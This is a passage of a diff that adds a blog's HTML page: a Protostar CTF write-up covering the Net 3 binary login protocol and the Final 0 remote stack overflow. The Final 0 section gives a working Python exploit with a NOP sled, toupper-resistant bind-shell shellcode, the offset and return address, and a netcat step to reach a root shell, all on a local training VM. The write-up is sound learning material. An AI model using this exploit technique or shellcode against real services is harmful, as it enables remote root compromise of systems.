+    <span class="k">if</span><span class="p">(</span><span class="n">len</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"invalid login packet length"</span><span class="p">);</span>
+
+    <span class="n">resource</span> <span class="o">=</span> <span class="n">username</span> <span class="o">=</span> <span class="n">password</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+    <span class="n">deduct</span> <span class="o">=</span> <span class="n">get_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">resource</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
+    <span class="n">deduct</span> <span class="o">+=</span> <span class="n">get_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">username</span><span class="p">,</span> <span class="n">buffer</span><span class="o">+</span><span class="n">deduct</span><span class="p">,</span> <span class="n">len</span><span class="o">-</span><span class="n">deduct</span><span class="p">);</span>
+    <span class="n">deduct</span> <span class="o">+=</span> <span class="n">get_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">password</span><span class="p">,</span> <span class="n">buffer</span><span class="o">+</span><span class="n">deduct</span><span class="p">,</span> <span class="n">len</span><span class="o">-</span><span class="n">deduct</span><span class="p">);</span>
+
+    <span class="n">success</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">success</span> <span class="o">|=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">resource</span><span class="p">,</span> <span class="s">"net3"</span><span class="p">);</span>
+    <span class="n">success</span> <span class="o">|=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="s">"awesomesauce"</span><span class="p">);</span>
+    <span class="n">success</span> <span class="o">|=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="s">"password"</span><span class="p">);</span>
+
+    <span class="n">free</span><span class="p">(</span><span class="n">resource</span><span class="p">);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">password</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="o">!</span> <span class="n">success</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">send_string</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">byte</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">){</span>
+    <span class="k">struct</span> <span class="n">iovec</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
+    <span class="n">u_int16_t</span> <span class="n">len</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">expected</span><span class="p">;</span>
+
+    <span class="n">len</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="mi">1</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">string</span><span class="p">));</span>
+
+    <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">;</span>
+    <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
+    
+    <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">byte</span><span class="p">;</span>
+    <span class="n">v</span> <span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+    <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">string</span><span class="p">;</span>
+    <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
+
+    <span class="n">expected</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">writev</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">!=</span> <span class="n">expected</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"failed to write correct amount of bytes"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">run</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">){</span>
+    <span class="n">u_int16_t</span> <span class="n">len</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">loggedin</span><span class="p">;</span>
+
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">nread</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">));</span>
+        <span class="n">len</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
+        <span class="n">buffer</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="n">buffer</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"malloc failure for %d bytes"</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
+
+        <span class="n">nread</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
+
+        <span class="k">switch</span><span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span>
+            <span class="k">case</span> <span class="mi">23</span><span class="p">:</span>
+                <span class="n">loggedin</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="n">buffer</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+                <span class="n">send_string</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="n">loggedin</span> <span class="o">?</span> <span class="s">"successful"</span> <span class="o">:</span> <span class="s">"failed"</span><span class="p">);</span>
+                <span class="k">break</span><span class="p">;</span>
+            
+            <span class="nl">default:</span>
+                <span class="n">send_string</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="s">"what you talkin about willis?"</span><span class="p">);</span>
+                <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
+    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
+
+    <span class="cm">/* Run the process as a daemon */</span>
+    <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span> 
+    
+    <span class="cm">/* Wait for socket activity and return */</span>
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
+
+    <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
+    <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+    <span class="cm">/* Don't do this :&gt; */</span>
+    <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+
+    <span class="n">run</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ol>
+  <li>What this program does is waiting for connections on port 2996 and checking the login creentials. After launching net3, we can test it with <code class="language-plaintext highlighter-rouge">nc 127.0.0.1 2996</code>.</li>
+  <li>The credentials have to be sent in a specific format: first send the total byte length of the login string, then in a second send push the string itself. This string has to contain the service, username and password, each prepended with its own size and appended with a NULL byte.</li>
+  <li>
+    <p>Again we create a python script that connects to the deamon, reads the data, manipulates it and sends it back.</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="n">socket</span>
+ <span class="kn">import</span> <span class="n">re</span>
+ <span class="kn">import</span> <span class="n">struct</span>
+
+ <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+ <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span><span class="p">,</span> <span class="mi">2996</span><span class="p">))</span>
+
+ <span class="n">login_string</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\x17</span><span class="sh">"</span>
+ <span class="n">login_string</span> <span class="o">+=</span> <span class="sh">"</span><span class="se">\x05</span><span class="s">net3</span><span class="se">\x00</span><span class="sh">"</span>
+ <span class="n">login_string</span> <span class="o">+=</span> <span class="sh">"</span><span class="se">\x0d</span><span class="s">awesomesauce</span><span class="se">\x00</span><span class="sh">"</span>
+ <span class="n">login_string</span> <span class="o">+=</span> <span class="sh">"</span><span class="se">\x0a</span><span class="s">password</span><span class="se">\x00</span><span class="sh">"</span>
+
+ <span class="n">login_length</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">login_string</span><span class="p">)</span>
+
+ <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;H</span><span class="sh">"</span><span class="p">,</span> <span class="n">login_length</span><span class="p">))</span>
+ <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">login_string</span><span class="p">)</span>
+ <span class="k">print</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+ <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div>    </div>
+  </li>
+  <li>The script creates the login string: first of all the “secret” byte to access the login functionality, then the name of the service, then the username and at the end the password. The length of this string is sent as unsigned short (as defined in the C code), then the string itself is sent out. The terminating NULL is required by the strcpy method.</li>
+</ol>
+
+<h3 id="final-00">[Final 00]</h3>
+<p>Combine a stack overflow and network programming for a remote overflow.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define NAME "final0"
+#define UID 0
+#define GID 0
+#define PORT 2995
+</span>
+<span class="cm">/*
+    * Read the username in from the network
+    */</span>
+
+<span class="kt">char</span> <span class="o">*</span><span class="nf">get_username</span><span class="p">(){</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+
+    <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+
+    <span class="cm">/* Strip off trailing new line characters */</span>
+    <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="sc">'\n'</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">*</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="sc">'\r'</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">*</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="cm">/* Convert to lower case */</span>
+    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">toupper</span><span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+    <span class="p">}</span>
+
+    <span class="cm">/* Duplicate the string and return it */</span>
+    <span class="k">return</span> <span class="n">strdup</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
+    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
+
+    <span class="cm">/* Run the process as a daemon */</span>
+    <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span> 
+    
+    <span class="cm">/* Wait for socket activity and return */</span>
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
+
+    <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
+    <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+    <span class="n">username</span> <span class="o">=</span> <span class="n">get_username</span><span class="p">();</span>
+    
+    <span class="n">printf</span><span class="p">(</span><span class="s">"No such user %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">username</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>nopsled: a NOP sled is a sequence of NOP (no-operation) instructions that are usually inserted as a landing zone for a jump that doesn’t have a precise target address. A nopsled gives a larger landing space, easier to guess than a single address, and will make the execution flow down to the actual starting point without secondary effects.</p>
+</blockquote>
+
+<ol>
+  <li>Upon connection, the service expects a username to be checked for existence. It is clear from the code that there is no actual check in place, therefore the goal of this challenge is to spawn a shell thanks to a buffer overflow in the username that we pass.</li>
+  <li>
+    <p>The first thing to do is to check how many characters we need to pass to overwrite the $eip after the buffer. We can’t do it automatically with the service we used until now because the toUpper function will mix up the results, so we will do it manually:</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="n">socket</span>
+ <span class="kn">import</span> <span class="n">struct</span>
+
+ <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+ <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span><span class="p">,</span> <span class="mi">2995</span><span class="p">))</span>
+
+ <span class="n">offset</span> <span class="o">=</span> <span class="sh">'</span><span class="s">a</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">512</span> <span class="o">+</span> <span class="sh">'</span><span class="s">b</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">c</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="sh">'</span><span class="s">d</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">4</span>
+
+ <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
+</code></pre></div>    </div>
+  </li>
+  <li>After executing the python script we switch to a root account with <code class="language-plaintext highlighter-rouge">su root</code> and password <code class="language-plaintext highlighter-rouge">godmode</code> to check if we managed to cause a segmentation fault. If yes, the core dump file is saved in /tmp and we can look at it with <code class="language-plaintext highlighter-rouge">gdb --core /tmp/core_xxx</code>. In this case we will see with what $eip crashed, and can adjust the length of our offset payload.</li>
+  <li>If no segfault happened, we have to try again with a longer payload. The goal is to find the perfect offset to be able to put an address in $eip, and this number is 532.</li>
+  <li>The shellcode that we want to use has to be resistent to the <code class="language-plaintext highlighter-rouge">toUpper</code> method. A working example can be taken from Exploit DB. Upon execution, we will be able to netcat to port 5074 and we should get a root shell.</li>
+  <li>
+    <p>We can now start to build the payload, knowing that we will need a return address that points at the start of the buffer but remembering that we don’t know the exact starting address of the buffer itself. To solve this problem, we start the payload with a nopsled, so that we can aim at the buffer without having to worry about guessing the precise address. After the sled we place the shellcode, than we pad with whatever until we reach the $eip, and there we put a mock address.</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="n">socket</span>
+ <span class="kn">import</span> <span class="n">struct</span>
+
+ <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+ <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span><span class="p">,</span> <span class="mi">2995</span><span class="p">))</span>
+
+ <span class="n">nop</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span><span class="o">*</span><span class="mi">24</span>
+
+ <span class="n">shellcode</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff</span><span class="sh">"</span> \
+ <span class="sh">"</span><span class="se">\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47</span><span class="sh">"</span> \
+ <span class="sh">"</span><span class="se">\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xed</span><span class="sh">"</span> \
+ <span class="sh">"</span><span class="s">DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKB</span><span class="sh">"</span> \
+ <span class="sh">"</span><span class="s">AFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIA</span><span class="sh">"</span> \
+ <span class="sh">"</span><span class="s">JDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJO</span><span class="sh">"</span> \
+ <span class="sh">"</span><span class="s">BLAALMNIA</span><span class="sh">"</span>
+
+ <span class="n">padding</span> <span class="o">=</span> <span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="p">(</span><span class="mi">532</span><span class="o">-</span><span class="nf">len</span><span class="p">(</span><span class="n">nop</span><span class="p">)</span><span class="o">-</span><span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+
+ <span class="n">ret</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\xaa\xaa\xaa\xaa</span><span class="sh">"</span>
+
+ <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">nop</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">ret</span><span class="p">)</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Running this script causes another segmentation fault, because our return address is obviously non-existing. So what we have to do is to find out a return address that makes sense. We start gdb again with the core dump, and we look at the registers, with <code class="language-plaintext highlighter-rouge">i r</code>. What we are interested in is the $esp register, that tells us where the stack ends.</li>
+  <li>Now it’s a matter of patience while looking at the stack content until we find our nopsled: we go through the memory with <code class="language-plaintext highlighter-rouge">gdb &gt; x/100x $esp-x</code>, where we increase x until we find the bunc of ‘90’ that correspond to the nop instructions.</li>
+  <li>We pick an address that points somewhere in the middle of the sled, in this way we can be sure that no matter what little shifts the stack will go through during execution we will still land in the proper place and peacefully slide down to the shellcode. We can pick 0xbffffa50, substitute it as the return address in our last script and run it again.</li>
+  <li>Our code executed nicely, and returned. We can now run netcat and check if we got actual root shell by issuing the whoami command: <code class="language-plaintext highlighter-rouge">nc 127.0.0.1 5074</code></li>
+</ol>
+
+<p>I find it a bit odd that to see if this exploit works we need to login with the godmode account. Makes me wonder if there is another approach, or if the whole attack should be carried out blindly.</p>
+
+<h3 id="final-01">[Final 01]</h3>
+<h3 id="final-02">[Final 02]</h3>
+<hr />
+
+
+        </div>
+
+        
+          <div class="page-share">
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fctf%2F2023%2F11%2F06%2FProtostar.html" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" class="btn btn--facebook btn--small"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i> <span>Share</span></a>
+  <a href="https://twitter.com/intent/tweet?text=Protostar+CTF%20http%3A%2F%2Flocalhost%3A4000%2Fctf%2F2023%2F11%2F06%2FProtostar.html" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" class="btn btn--twitter btn--small"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i> <span>Tweet</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fctf%2F2023%2F11%2F06%2FProtostar.html" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" class="btn btn--linkedin btn--small"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> <span>LinkedIn</span></a>
+  <a href="https://reddit.com/submit?title=Protostar+CTF&url=http%3A%2F%2Flocalhost%3A4000%2Fctf%2F2023%2F11%2F06%2FProtostar.html" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" class="btn btn--reddit btn--small"><i class="fab fa-fw fa-reddit" aria-hidden="true"></i> <span>Reddit</span></a>
+</div>
+
+        
+
+        
+
+        <nav class="page-pagination" role="navigation">
+  
+    <a class="page-previous" href="/ctf/2023/11/05/Nebula.html">
+      <h4 class="page-pagination-label">Previous</h4>
+      <span class="page-pagination-title">
+        <i class="fas fa-arrow-left"></i> Nebula CTF
+
+      </span>
+    </a>
+  
+
+  
+    <a class="page-next" href="/rpg/2023/11/10/Dave-Ex-Machina.html">
+      <h4 class="page-pagination-label">Next</h4>
+      <span class="page-pagination-title">
+        Dave Ex Machina
+ <i class="fas fa-arrow-right"></i>
+      </span>
+    </a>
+  
+</nav>
+
+      </div>
+    </div>
+  </article>
+</main>
+
+
+    <footer id="footer" class="site-footer">
+  <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+<div class="social-icons"><a class="social-icon" href="/atom.xml"><i class="fas fa-rss-square fa-2x" title="Feed"></i></a></div><div class="copyright">
+    
+      <p>&copy; 2024 Cloud Castle Chaos. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://github.com/mmistakes/so-simple-theme" rel="nofollow">So Simple</a>.</p>
+    
+  </div>
+</footer>
+
+    <script src="https://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.0.12/js/all.js"></script>
+
+
+<!-- MathJax -->
+
+<script>
+// http://docs.mathjax.org/en/latest/upgrading/v2.html
+MathJax = {
+  tex: {
+      tags: "ams"    // eq numbering options: none, ams, all
+  },
+  options: {
+    renderActions: {
+      // for mathjax 3, handle <script "math/tex"> blocks inserted by kramdown
+      find: [10, function (doc) {
+        for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+          const display = !!node.type.match(/; *mode=display/);
+          const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+          const text = document.createTextNode('');
+          node.parentNode.replaceChild(text, node);
+          math.start = {node: text, delim: '', n: 0};
+          math.end = {node: text, delim: '', n: 0};
+          doc.math.push(math);
+        }
+      }, '']
+    }
+  }
+}
+</script>
+
+<script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js"></script>
+
+  </body>
+
+</html>
